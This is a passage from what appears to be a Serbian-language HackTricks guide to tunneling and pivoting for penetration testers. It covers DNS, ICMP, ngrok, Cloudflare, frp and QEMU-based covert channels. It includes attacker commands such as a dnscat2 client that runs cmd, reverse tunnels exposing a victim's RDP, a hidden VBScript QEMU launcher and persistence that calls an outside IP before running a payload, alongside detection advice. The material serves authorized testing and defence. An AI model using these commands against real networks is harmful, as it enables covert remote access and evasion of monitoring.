[`rdp2tcp`](../network-services-pentesting/pentesting-rdp.md#rdp-virtual-channel-tunneling) je još jedan RDP tunel koji koristi virtuelni kanal; njegovo podrazumevano ime kanala je `rdp2tcp`, ali operator može da izabere drugo ime.<sup>[[56]](#references)</sup> Kreiranje i zatvaranje kanala beleže se u `Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational` kao ID-jevi događaja **132** i **148**. Potraži `rdp2tcp` i retka/nasumična imena kanala, a zatim ih uporedi sa očekivanim kanalima kao što su `XPSRD`, `cliprdr` i `Microsoft::Windows::RDS::DisplayControl`.<sup>[[58]](#references)</sup>

## Usmeravanje Windows GUI aplikacija kroz proxy

Windows GUI aplikacije možeš podesiti da pristupaju mreži kroz proxy pomoću [**Proxifier**](https://www.proxifier.com/).<sup>[[26]](#references)</sup>\
U **Profile -> Proxy Servers** dodaj IP adresu i port SOCKS servera.\
U **Profile -> Proxification Rules** dodaj ime programa za koji želiš da usmeravaš saobraćaj kroz proxy, kao i veze ka IP adresama za koje želiš to da radiš; Proxifier pravila mogu da se podudaraju sa aplikacijama, odredišnim hostovima i portovima.<sup>[[27]](#references)</sup>

## Tuneliranje kroz NTLM proxy

Prethodno pomenuti alat **Rpivot** može da prosleđuje saobraćaj kroz proxy koji koristi NTLM autentifikaciju. **OpenVPN** takođe može da usmerava saobraćaj kroz takav proxy ako je konfigurisan pomoću auth datoteke i metode NTLMv2; ovo je prolazak kroz proxy, a ne zaobilaženje proxy autentifikacije.<sup>[[20]](#references)[[28]](#references)</sup>

```bash
http-proxy <proxy_ip> 8080 <file_with_creds> ntlm2
```

### Cntlm

[http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)

Cntlm se autentifikuje na nadređene NTLM proxy servere, otvara lokalne listening portove i može da mapira lokalni port tunela na odredišnu uslugu; klijenti zatim mogu da koriste taj lokalni port.<sup>[[29]](#references)</sup>\
Na primer, prosledite port 443.

```
Username Alice
Password P@ssw0rd
Domain CONTOSO.COM
Proxy 10.0.0.10:8080
Tunnel 2222:<attackers_machine>:443
```

Sada, ako na primer podesite da **SSH** servis na žrtvi osluškuje na portu 443, možete da se povežete s njim preko porta 2222 na napadaču.<sup>[[29]](#references)</sup>\
Možete da koristite i **meterpreter** koji se povezuje na localhost:443, dok napadač osluškuje na portu 2222.<sup>[[29]](#references)</sup>

## YARP

YARP (Yet Another Reverse Proxy) je Microsoftov .NET alat za reverse proxy. Možete ga pronaći ovde: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy).<sup>[[30]](#references)</sup>

## DNS Tunneling

### Iodine

[https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)

Iodine kreira IPv4 tunel putem DNS upita i koristi TUN interfejse; dokumentovano podešavanje zahteva privilegije potrebne za kreiranje tih interfejsa na oba kraja.<sup>[[31]](#references)</sup>

```
attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
victim> iodine -f -P P@ssw0rd tunneldomain.com -r
#You can see the victim at 1.1.1.2
```

DNS prenos ima veće režijske troškove nego direktni TCP i obično je spor; možete uspostaviti kompresovanu SSH vezu kroz ovaj tunel koristeći:<sup>[[31]](#references)</sup>

```
ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
```

### DNSCat2

[**Preuzmite ga ovde**](https://github.com/iagox86/dnscat2)**.**

Dnscat2 uspostavlja šifrovani command-and-control kanal preko DNS-a; komande servera i klijenta u nastavku prate njegovu dokumentovanu upotrebu.<sup>[[32]](#references)</sup>

```bash
attacker> ruby ./dnscat2.rb tunneldomain.com
victim> ./dnscat2 tunneldomain.com

# If using it in an internal network for a CTF:
attacker> ruby dnscat2.rb --dns host=10.10.10.10,port=53,domain=mydomain.local --no-cache
victim> ./dnscat2 --dns host=10.10.10.10,port=5353
```

#### **U PowerShell-u**

Možete koristiti [**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell) da biste pokrenuli dnscat2 klijent u PowerShell-u; njegov README dokumentuje parametre za `Start-Dnscat2` prikazane ispod.<sup>[[33]](#references)</sup>

```
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
```

#### **Port forwarding pomoću dnscat**

Interaktivna komanda `listen` u dnscat2 mapira lokalni listener na udaljeni host i port.<sup>[[32]](#references)</sup>

```bash
session -i <sessions_id>
listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
```

#### Promena proxychains DNS-a

Proxychains-ng presreće dinamički povezane TCP konekcije i ne može da prenosi UDP ili ICMP; DNS proxying se može konfigurisati, zato proverite instalirani `proxychains.conf` i pomoćni resolver umesto da pretpostavite da se koristi fiksni javni resolver. Zastarele `proxyresolv` skripte omogućavaju da se preko `PROXY_DNS_SERVER` izabere resolver; koristite resolver dostupan sa pivot-a kada su potrebna interna imena.<sup>[[34]](#references)[[35]](#references)</sup>

## Tuneli u Go

[https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)

### Custom DNS TXT / HTTP JSON C2 (AK47C2)

Akter Storm-2603 kreirao je **dvokanalni C2 („AK47C2“) ** koji zloupotrebljava *samo* odlazni **DNS** i **običan HTTP POST** saobraćaj — dva protokola koja se retko blokiraju na korporativnim mrežama.<sup>[[2]](#references)</sup>

1. **DNS režim (AK47DNS)**
   • Generiše nasumični 5-znakovni SessionID (npr. `H4T14`).  
   • Dodaje prefiks `1` za *zahteve za zadatke* ili `2` za *rezultate* i spaja različita polja (zastavice, SessionID, ime računara).  
   • Svako polje se **XOR-om šifruje ASCII ključem `VHBD@H`**, kodira u heksadecimalnom formatu i spaja tačkama — a na kraju se dodaje domen pod kontrolom napadača:

   ```text
   <1|2><SessionID>.a<SessionID>.<Computer>.update.updatemicfosoft.com
   ```

   • Zahtevi koriste `DnsQuery()` za **TXT** zapise (i rezervne **MG** zapise).  
   • Kada odgovor premaši 0xFF bajtova, backdoor **fragmentuje** podatke u delove od 63 bajta i umeće oznake:
     `s<SessionID>t<TOTAL>p<POS>` kako bi C2 server mogao da ih poređa.

2. **HTTP mode (AK47HTTP)**
   • Sastavlja JSON omotnicu:
   ```json
   {"cmd":"","cmd_id":"","fqdn":"<host>","result":"","type":"task"}
   ```
   • Ceo blob se XOR-uje sa `VHBD@H` → hex → šalje kao telo **`POST /`** zahteva sa zaglavljem `Content-Type: text/plain`.
   • Odgovor koristi isto kodiranje, a polje `cmd` se izvršava pomoću `cmd.exe /c <command> 2>&1`.

Beleške Blue Team-a
• Obratite pažnju na neuobičajene **TXT upite** čija je prva oznaka dugačak heksadecimalni niz i koji se uvek završavaju istim retkim domenom.  
• Konstantni XOR ključ praćen ASCII heksadecimalnim zapisom lako se otkriva pomoću YARA: `6?56484244?484` (`VHBD@H` u heksadecimalnom zapisu).  
• Za HTTP, označite tela `text/plain` POST zahteva koja sadrže samo heksadecimalne znakove i imaju paran broj bajtova.

{{#note}}
Kanal ograničava dužinu svake poddomenske oznake na DNS limit od 63 okteta, ali usklađenost sa protokolom sama po sebi ne čini ga neupadljivim; retki domeni, dugačke heksadecimalne oznake i obim upita i dalje su signali za detekciju.<sup>[[2]](#references)[[36]](#references)</sup>
{{#endnote}}

## ICMP Tunneling

### Hans

[https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
[https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)

Hans dokumentuje IPv4-over-ICMP tunel koji koristi TUN uređaj i ICMP echo zahteve; podešavanje zahteva privilegije dovoljne za kreiranje interfejsa.<sup>[[37]](#references)</sup>

```bash
./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
./hans -f -c <server_ip> -p P@ssw0rd -v
ping 1.1.1.100 #After a successful connection, the victim will be in the 1.1.1.100
```

### ptunnel-ng

[**Preuzmite ga ovde**](https://github.com/utoni/ptunnel-ng.git).

ptunnel-ng prenosi TCP veze preko ICMP-a i koristi opcije `-p`, `-l`, `-r` i `-R` prikazane ispod za proxy, lokalni listener, odredišni host i odredišni port.<sup>[[38]](#references)</sup>

```bash
# Generate it
sudo ./autogen.sh

# Server -- victim (needs to be able to receive ICMP)
sudo ptunnel-ng
# Client - Attacker
sudo ptunnel-ng -p <server_ip> -l <listen_port> -r <dest_ip> -R <dest_port>
# Try to connect with SSH through ICMP tunnel
ssh -p 2222 -l user 127.0.0.1
# Create a socks proxy through the SSH connection through the ICMP tunnel
ssh -D 9050 -p 2222 -l user 127.0.0.1
```

## ngrok

[**ngrok**](https://ngrok.com/) je agent za povezivanje lokalnih mrežnih servisa na internet putem bezbednog tunela; njegov CLI dokumentuje HTTP, TCP i file URL endpoint-e, a hostname ispisanog endpoint-a može da se razlikuje u zavisnosti od endpoint-a i naloga.<sup>[[39]](#references)</sup>

### Instalacija

- Napravite nalog: https://ngrok.com/signup
- Preuzimanje klijenta:

```bash
tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
chmod a+x ./ngrok
# Init configuration, with your token
./ngrok config edit
```

### Osnovne upotrebe

**Dokumentacija:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).

_Agent podržava i opcije za autentifikaciju i TLS, kada su potrebne.<sup>[[39]](#references)</sup>_

#### Tunelovanje TCP-a

```bash
# Pointing to 0.0.0.0:4444
./ngrok tcp 4444
# Example of resulting link: 0.tcp.ngrok.io:12345
# Listen (example): nc -nvlp 4444
# Remote connect (example): nc $(dig +short 0.tcp.ngrok.io) 12345
```

#### Izlaganje datoteka putem HTTP-a

```bash
./ngrok http file:///tmp/httpbin/
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
```

#### Sniffing HTTP calls

_Korisno za XSS, SSRF, SSTI ..._\
Samostalni agent podrazumevano izlaže svoj interfejs za inspekciju HTTP saobraćaja na adresi `http://127.0.0.1:4040`; interfejs je namenjen HTTP saobraćaju.<sup>[[40]](#references)</sup>

#### Tunneling internog HTTP servisa

Opcija `--host-header=rewrite` prepisuje upstream HTTP `Host` zaglavlje tako da odgovara lokalnom servisu.<sup>[[41]](#references)</sup>

```bash
./ngrok http localhost:8080 --host-header=rewrite
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
# With basic auth
./ngrok http localhost:8080 --host-header=rewrite --auth="myuser:mysuperpassword"
```

#### jednostavan primer ngrok.yaml konfiguracije

Ovo koristi ngrok Agent Config v2; imenovani tuneli koriste `proto` i `addr`, a pokreću se pomoću `ngrok start`.<sup>[[42]](#references)</sup> Otvara 3 tunela:

- 2 TCP
- 1 HTTP sa izlaganjem statičkih datoteka iz /tmp/httpbin/

```yaml
version: 2
tunnels:
  mytcp:
    addr: 4444
    proto: tcp
  anothertcp:
    addr: 5555
    proto: tcp
  httpstatic:
    proto: http
    addr: file:///tmp/httpbin/
```

## Microsoft Dev Tunnels

Microsoft Dev Tunnels mogu da objave lokalnu uslugu zasnovanu na TCP-u preko Microsoft relay infrastrukture. Host CLI kreira odlazni tunel, dok `devtunnel connect` ponovo kreira hostovani port na klijentu; tuneli podrazumevano zahtevaju autentifikaciju, osim ako se kontrole pristupa namerno ne ublaže.<sup>[[55]](#references)[[58]](#references)</sup>

```bash
# Compromised/pivot host: publish its local RDP service
# Save the tunnel ID printed by this command
devtunnel host -p 3389

# Operator host: authenticate as an authorized tunnel user and create
# a local 127.0.0.1:3389 forward to the hosted port
devtunnel connect <TUNNEL_ID>
xfreerdp /u:<USER> /v:127.0.0.1:3389
```

Ovo može da izloži RDP preko `*.devtunnels.ms` bez otvaranja novog ulaznog listenera na perimetru. Može se kombinovati i sa RDP virtual-channel tunelom kao što je `rdp2tcp`, čime se RDP sesija pretvara u pivot druge faze za proizvoljan TCP saobraćaj.<sup>[[58]](#references)</sup>

Za lov na pretnje, korelišite pokretanje Dev Tunnels CLI-ja sa DNS/TLS saobraćajem ka `*.devtunnels.ms` i neočekivanim događajima RDP virtual-channel-a. Autentifikovani tunel nije bezazlen samo zato što koristi relej u vlasništvu Microsofta.<sup>[[58]](#references)</sup>

## Cloudflared (Cloudflare Tunnel)

Cloudflare Tunnel-ov konektor `cloudflared` uspostavlja izlazne veze; objavljene aplikacije mogu da usmeravaju HTTP, HTTPS, TCP, SSH i RDP, dok su quick tunnels namenjeni HTTP razvoju.<sup>[[43]](#references)[[45]](#references)</sup>

### Jednolinijska komanda za quick tunnel

```bash
# Expose a local web service listening on 8080
cloudflared tunnel --url http://localhost:8080
# => Generates https://<random>.trycloudflare.com that forwards to 127.0.0.1:8080
```

### SOCKS5 poreklo (nasleđeni režim)

Nasleđena zastavica `--socks5` govori alatu `cloudflared` da lokalno poreklo koristi SOCKS5; ona ne kreira lokalni SOCKS5 listener. Za upravljani tunel, `originRequest.proxyType: socks` podešava obradu SOCKS5 porekla.<sup>[[44]](#references)</sup>

```bash
# Expose a local SOCKS5-speaking origin (legacy syntax)
cloudflared tunnel --url socks5://localhost:1080 --socks5
```

### Trajni tuneli sa DNS-om

Lokalno upravljana konfiguracija tunela koristi ključeve `tunnel`, `credentials-file` i `url` pisane malim slovima, kao što je prikazano ispod.<sup>[[46]](#references)</sup>

```bash
cloudflared tunnel create mytunnel
cloudflared tunnel route dns mytunnel internal.example.com
# config.yml
tunnel: <TUNNEL-UUID>
credentials-file: /root/.cloudflared/<TUNNEL-UUID>.json
url: http://127.0.0.1:8000
```

Pokrenite konektor:

```bash
cloudflared tunnel run mytunnel
```

Konektor uspostavlja odlazne veze i, podrazumevano, pregovara o QUIC-u uz prelazak na HTTP/2 ako je potrebno; nemojte pretpostavljati da svako okruženje koristi TCP/443. Pokrenite ga samo sa privilegijama potrebnim za vaše okruženje.<sup>[[43]](#references)[[47]](#references)</sup>

## FRP (Fast Reverse Proxy)

[`frp`](https://github.com/fatedier/frp) je Go reverse proxy koji podržava **TCP, UDP, HTTP/S, STCP/SUDP, TCPMUX i XTCP**. XTCP koristi P2P hole punching, čiji uspeh zavisi od NAT-a. Od verzije **v0.53.0** može da radi kao **SSH Tunnel Gateway**, pa ciljni host može da koristi standardni OpenSSH klijent bez binarne datoteke `frpc`.<sup>[[48]](#references)[[49]](#references)[[50]](#references)</sup>

### Classic reverse TCP tunnel

```bash
# Attacker / server
./frps -c frps.toml            # listens on 0.0.0.0:7000

# Victim
./frpc -c frpc.toml            # will expose 127.0.0.1:3389 on frps:5000

# frpc.toml
serverAddr = "attacker_ip"
serverPort = 7000

[[proxies]]
name       = "rdp"
type       = "tcp"
localIP    = "127.0.0.1"
localPort  = 3389
remotePort = 5000
```

### Korišćenje novog SSH gateway-a (bez frpc binarne datoteke)

```bash
# On frps (attacker)
sshTunnelGateway.bindPort = 2200   # add to frps.toml
./frps -c frps.toml

# On victim (OpenSSH client only)
ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_port 9000
```

Gornja komanda objavljuje port žrtve **8080** kao **attacker_ip:9000**, koristeći standardni OpenSSH klijent, dok `frps` obezbeđuje gateway.<sup>[[50]](#references)</sup>

## UDP back-connect veze uz pomoć STUN-a

STUN Binding zahtevi poslati sa UDP socketa mogu da otkriju njegovu server-refleksivnu IP adresu i port, dok periodični saobraćaj održava NAT mapiranje aktivnim. Javni STUN server nije relay za proizvoljne kontrolne pakete.<sup>[[60]](#references)</sup> Analizirani dizajn back-connect veze zadržavao je isti UDP socket za kratki kontrolni datagram, a zatim koristio *zasebnu odlaznu TCP vezu* za preuzimanje i izvršavanje komandi nakon prijema okidača.<sup>[[59]](#references)</sup>

Da bi primio UDP paket kontrolera, dizajn i dalje mora da podeli mapiranje sa tim kontrolerom i da zadovolji NAT-ovu politiku filtriranja. Filtriranje zavisno od adrese ili porta može da prihvati odgovore STUN servera, ali odbaci pakete sa druge krajnje tačke.<sup>[[60]](#references)[[61]](#references)</sup> Putanja za uspostavljanje veze backdoor-a nije verifikovana, pa uspešni STUN odgovori sami po sebi ne dokazuju da je kontrolni kanal dostupan.<sup>[[59]](#references)</sup> Za zaseban protokol sa eksplicitnim uspostavljanjem veze i rezervnim relay-om, pogledajte [NAT traversal za PPPP kamere](../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md#nat-traversal-and-transport).

## Skriveni tuneli zasnovani na VM-u uz QEMU

QEMU mreženje u korisničkom režimu ne zahteva root ili administratorske privilegije za virtuelnu mrežu, a `-netdev user,hostfwd=...` preusmerava TCP, UDP ili UNIX veze sa hosta na guest.<sup>[[51]](#references)</sup> TrustedSec je dokumentovao Tiny Core QEMU VM i pokušaj obrnutog SSH tunela u incidentu u kom je EDR usmeren na host mogao da propusti aktivnost unutar guest-a.<sup>[[1]](#references)</sup>

### Brza jednolinijska komanda

```powershell
# Windows victim (user-mode networking; no TAP driver is needed for this example)
qemu-system-x86_64.exe ^
   -m 256M ^
   -drive file=tc.qcow2,if=ide ^
   -netdev user,id=n0,hostfwd=tcp::2222-:22 ^
   -device e1000,netdev=n0 ^
   -nographic
```

• Gornja komanda pokreće **Tiny Core Linux** guest sa 256 MiB guest memorije i qcow2 slikom diska; slika diska nije disk u RAM-u.
• Port **2222/tcp** na Windows hostu transparentno se prosleđuje na **22/tcp** unutar guest-a.
• Iz perspektive napadača, cilj jednostavno izlaže port 2222; sve pakete koji stignu do njega obrađuje SSH server pokrenut u VM-u.

### Neprimetno pokretanje kroz VBScript

TrustedSec je u prethodno navedenom incidentu uočio pokretanje QEMU-a pomoću VBS-a i Tiny Core slike.<sup>[[1]](#references)</sup>

```vb
' update.vbs – lived in C:\ProgramData\update
Set o = CreateObject("Wscript.Shell")
o.Run "stl.exe -m 256M -drive file=tc.qcow2,if=ide -netdev user,id=n0,hostfwd=tcp::2222-:22", 0
```

Pokretanje skripte pomoću `cscript.exe //B update.vbs` drži prozor sakrivenim.<sup>[[1]](#references)</sup>

### Persistence unutar guest sistema

U opisanom incidentu persistence u stateless Tiny Core guest sistemu ostvarena je preko `/opt/bootlocal.sh` i `/opt/filetool.lst`:<sup>[[1]](#references)</sup>

1. Smestite payload u `/opt/123.out`  
2. Dodajte u `/opt/bootlocal.sh`:

   ```sh
   while ! ping -c1 45.77.4.101; do sleep 2; done
   /opt/123.out
   ```

3. Dodajte `home/tc` i `opt` u `/opt/filetool.lst` kako bi payload bio upakovan u `mydata.tgz` prilikom gašenja.

### Razmatranja u vezi sa telemetrijom

• Host i dalje izlaže QEMU proces, qcow2 image i svaki listener prosleđen sa hosta.  
• Skeniranja procesa koja se obavljaju samo na hostu možda neće pregledati procese u guest-u, ali virtuelizacija ne garantuje izbegavanje detekcije; mrežna telemetrija, QEMU i image i dalje mogu da ga otkriju.<sup>[[1]](#references)[[51]](#references)</sup>

### Saveti za odbranu

• Postavite upozorenje za **neočekivane QEMU/VirtualBox/KVM binarne datoteke** na putanjama u koje korisnik može da upisuje.  
• Blokirajte odlazne konekcije koje potiču od `qemu-system*.exe`.  
• Potražite retke portove za osluškivanje (2222, 10022, …) koji počinju da se vezuju odmah nakon pokretanja QEMU-a.

## IIS/HTTP.sys relay čvorovi preko `HttpAddUrl` (ShadowPad)

Check Point opisuje IIS modul ShadowPad-a kao komponentu koja pretvara kompromitovane perimeter web servere u backdoor i relay čvorove vezivanjem URL prefiksa preko `HttpAddUrl`.<sup>[[3]](#references)</sup>

Isti izveštaj detaljno opisuje podrazumevane vrednosti, wildcard listenere, dešifrovanje paketa, relay redove i debug telemetriju, sažete u nastavku.<sup>[[3]](#references)</sup>

* **Podrazumevana podešavanja** – ako JSON konfiguracija modula izostavi vrednosti, koristi verodostojna IIS podrazumevana podešavanja (`Server: Microsoft-IIS/10.0`, `DocumentRoot: C:\inetpub\wwwroot`, `ErrorPage: C:\inetpub\custerr\en-US\404.htm`). Tako IIS odgovara na benigni saobraćaj koristeći ispravno brendiranje.
* **Wildcard presretanje** – operateri navode listu URL prefiksa razdvojenih tačkom i zarezom (wildcard-i u hostu + putanji). Modul poziva `HttpAddUrl` za svaki unos, pa HTTP.sys usmerava odgovarajuće zahteve ka zlonamernom handler-u; zahtevi koji se ne podudaraju vraćaju se na uobičajeno IIS ponašanje.
* **Prvi šifrovani paket** – prva dva bajta tela zahteva sadrže seed za prilagođeni 32-bitni PRNG. Svaki naredni bajt se XOR-uje sa generisanim keystream-om pre parsiranja protokola:

  ```python
  def decrypt_first_packet(buf):
      seed = buf[0] | (buf[1] << 8)
      num = seed & 0xFFFFFFFF
      out = bytearray(buf)
      for i in range(2, len(out)):
          hi = (num >> 16) & 0xFFFF
          num = (hi * 0x7093915D - num * 0x6EA30000 + 0x06B0F0E3) & 0xFFFFFFFF
          out[i] ^= num & 0xFF
      return out
  ```

* **Orkestracija releja** – modul održava dve liste: „servers“ (uzvodni čvorovi) i „clients“ (nizvodni implantati). Unosi se uklanjaju ako ne stigne heartbeat u roku od približno 30 sekundi. Kada obe liste nisu prazne, uparuje prvi ispravan server sa prvim ispravnim klijentom i jednostavno prosleđuje bajtove između njihovih socket-a dok jedna strana ne prekine vezu.
* **Telemetrija za otklanjanje grešaka** – opciono beleženje čuva izvornu IP adresu, odredišnu IP adresu i ukupan broj prosleđenih bajtova za svaki par. Istražitelji su iskoristili te tragove da rekonstruišu ShadowPad mrežu koja se prostirala na više žrtava.

---

## Ostali alati za proveru

- [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
- [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)

## References

- [1] [Skrivanje u senkama: Skriveni tuneli putem QEMU virtualizacije](https://trustedsec.com/blog/hiding-in-the-shadows-covert-tunnels-via-qemu-virtualization)
- [2] [Check Point Research – Pre ToolShell-a: Istraživanje prethodnih ransomware operacija grupe Storm-2603](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [3] [Check Point Research – Unutar Ink Dragon-a: Otkrivanje relejne mreže i unutrašnjeg funkcionisanja prikrivene ofanzivne operacije](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [4] [Evil-WinRM README](https://raw.githubusercontent.com/Hackplayers/evil-winrm/master/README.md)
- [5] [Nmap referentni vodič: Zaobilaženje ograničenja Firewall/IDS sistema](https://nmap.org/book/man-bypass-firewalls-ids.html)
- [6] [OpenBSD ssh priručnik](https://man.openbsd.org/ssh)
- [7] [OpenBSD sshd_config priručnik](https://man.openbsd.org/sshd_config)
- [8] [Beleške o izdanju OpenSSH 9.6](https://www.openssh.org/txt/release-9.6)
- [9] [sshuttle README](https://raw.githubusercontent.com/sshuttle/sshuttle/master/README.rst)
- [10] [Metasploit: Pivoting u Metasploit-u](https://docs.metasploit.com/docs/using-metasploit/intermediate/pivoting-in-metasploit.html)
- [11] [Dokumentacija Metasploit socks_proxy modula](https://raw.githubusercontent.com/rapid7/metasploit-framework/master/documentation/modules/auxiliary/server/socks_proxy.md)
- [12] [Dokumentacija Metasploit autoroute modula](https://raw.githubusercontent.com/rapid7/metasploit-framework/master/documentation/modules/post/multi/manage/autoroute.md)
- [13] [Cobalt Strike: SOCKS Proxy](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/pivoting_socks-proxy.htm)
- [14] [Cobalt Strike: Obrnuto prosleđivanje porta](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/pivoting_reverse-port-forward.htm)
- [15] [reGeorg README](https://raw.githubusercontent.com/sensepost/reGeorg/master/README.md)
- [16] [Chisel README](https://raw.githubusercontent.com/jpillora/chisel/master/README.md)
- [17] [Ligolo-ng vodič za brzi početak](https://docs.ligolo.ng/Quickstart/)
- [18] [Ligolo-ng Listener-i](https://docs.ligolo.ng/Listeners/)
- [19] [Ligolo-ng Localhost](https://docs.ligolo.ng/Localhost/)
- [20] [rpivot README](https://raw.githubusercontent.com/klsecservices/rpivot/master/README.md)
- [21] [socat priručnik](https://man7.org/linux/man-pages/man1/socat.1.html)
- [22] [PuTTY Plink priručnik](https://the.earth.li/~sgtatham/putty/0.84/htmldoc/Chapter7.html)
- [23] [PuTTY opcije komandne linije](https://the.earth.li/~sgtatham/putty/0.84/htmldoc/Chapter3.html)
- [24] [Microsoft netsh interface portproxy komanda](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface)
- [25] [SocksOverRDP README](https://raw.githubusercontent.com/nccgroup/SocksOverRDP/master/README.md)
- [26] [Proxifier dokumentacija](https://www.proxifier.com/docs/win-v4/)
- [27] [Proxifier pravila za proxification](https://www.proxifier.com/docs/win-v3/rules.htm)
- [28] [OpenVPN 2.7 priručnik](https://openvpn.net/community-docs/community-articles/openvpn-2-7-manual.html)
- [29] [Cntlm](https://cntlm.sourceforge.net/)
- [30] [YARP README](https://raw.githubusercontent.com/dotnet/yarp/main/README.md)
- [31] [iodine README](https://code.kryo.se/iodine/README.html)
- [32] [dnscat2 README](https://raw.githubusercontent.com/iagox86/dnscat2/master/README.md)
- [33] [dnscat2-powershell README](https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/README.md)
- [34] [proxychains-ng README](https://raw.githubusercontent.com/rofl0r/proxychains-ng/master/README)
- [35] [proxyresolv](https://github.com/haad/proxychains/blob/master/src/proxyresolv)
- [36] [RFC 1035: Imena domena – implementacija i specifikacija](https://www.rfc-editor.org/rfc/rfc1035)
- [37] [Hans](https://code.gerade.org/hans/)
- [38] [ptunnel-ng README](https://raw.githubusercontent.com/utoni/ptunnel-ng/master/README.md)
- [39] [ngrok Agent CLI](https://ngrok.com/docs/agent/cli)
- [40] [ngrok Web interfejs za inspekciju](https://ngrok.com/docs/agent/web-inspection-interface)
- [41] [ngrok virtuelni hostovi](https://ngrok.com/docs/using-ngrok-with/virtualHosts)
- [42] [ngrok Agent Config v2](https://ngrok.com/docs/agent/config/v2)
- [43] [Pregled Cloudflare Tunnel-a](https://developers.cloudflare.com/tunnel/)
- [44] [Parametri izvornog servera za Cloudflare Tunnel](https://developers.cloudflare.com/tunnel/advanced/origin-parameters/)
- [45] [Podešavanje Cloudflare Tunnel-a](https://developers.cloudflare.com/tunnel/setup/)
- [46] [Konfiguraciona datoteka za Cloudflare Tunnel](https://developers.cloudflare.com/cloudflare-one/networks/connectors/cloudflare-tunnel/do-more-with-tunnels/local-management/configuration-file/)
- [47] [Parametri pokretanja Cloudflare Tunnel-a](https://developers.cloudflare.com/tunnel/advanced/run-parameters/)
- [48] [frp koncepti](https://gofrp.org/en/docs/concepts/)
- [49] [frp XTCP](https://gofrp.org/en/docs/features/xtcp/)
- [50] [frp SSH Tunnel Gateway](https://gofrp.org/en/docs/features/common/ssh/)
- [51] [QEMU dokumentacija za umrežavanje](https://www.qemu.org/docs/master/system/devices/net.html)
- [52] [wstunnel README](https://github.com/erebe/wstunnel/blob/main/README.md)
- [53] [Izvorni repozitorijum NetSPI BOFScale-a](https://github.com/NetSPI/BOFscale)
- [54] [BOFScale: Tailnet iza CDN-a iz BOF-PE-a](https://www.netspi.com/blog/technical-blog/red-teaming/bofscale-a-cdn-fronted-tailnet-from-a-bof-pe/)
- [55] [Microsoft Learn - Dev Tunnels CLI komande](https://learn.microsoft.com/en-us/azure/developer/dev-tunnels/cli-commands)
- [56] [V-E-O/rdp2tcp](https://github.com/V-E-O/rdp2tcp)
- [57] [Fortra Impacket - atexec.py](https://github.com/fortra/impacket/blob/master/examples/atexec.py)
- [58] [NightEagle APT: GhostContainer i tunelovanje](https://securelist.com/tr/nighteagle-apt-ghostcontainer-and-tunneling/121323/)
- [59] [FortiGuard Labs - Linux backdoor ClingSTUN zloupotrebljava javnu STUN infrastrukturu](https://www.fortinet.com/blog/threat-research/clingstun-linux-backdoor-abuses-public-stun-infrastructure)
- [60] [RFC 8489 - Session Traversal Utilities for NAT (STUN)](https://www.rfc-editor.org/rfc/rfc8489.html)
- [61] [RFC 4787 - Zahtevi za ponašanje NAT-a pri unicast UDP-u](https://www.rfc-editor.org/rfc/rfc4787.html)
- [62] [Tailcat README](https://github.com/tailscale/tailcat/blob/main/README.md)
- [63] [Malwarebytes - Kothamine malware koristi Tailscale-ov tailcat da izbegne mrežno otkrivanje](https://www.malwarebytes.com/blog/threat-intel/2026/09/kothamine-malware-uses-tailscales-tailcat-to-evade-network-detection)
{{#include ../banners/hacktricks-training.md}}
